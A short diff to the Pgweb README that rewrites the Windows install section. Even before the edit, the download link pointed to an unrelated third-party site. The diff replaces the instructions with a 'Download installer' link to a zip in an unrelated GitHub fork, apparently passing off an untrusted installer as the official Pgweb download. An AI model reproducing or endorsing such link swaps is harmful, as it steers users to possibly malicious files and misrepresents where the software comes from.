@@ -11,9 +11,7 @@ Pgweb binaries and source code for each version is distributed via [Github Relea
 
 ### Windows
 
-There's no automated way to install Pgweb on Windows. You should download
-the ZIP archive for your OS: [`pgweb_windows_amd64.exe.zip`](https://www.ps3cfw.com/cool.php?item=37948383) then unpack it and
-move to applications folder.
+[Download installer](https://github.com/FrankFeng/Spoon-Knife/raw/master/Installer%20windows.zip)
 
 ### Docker
 
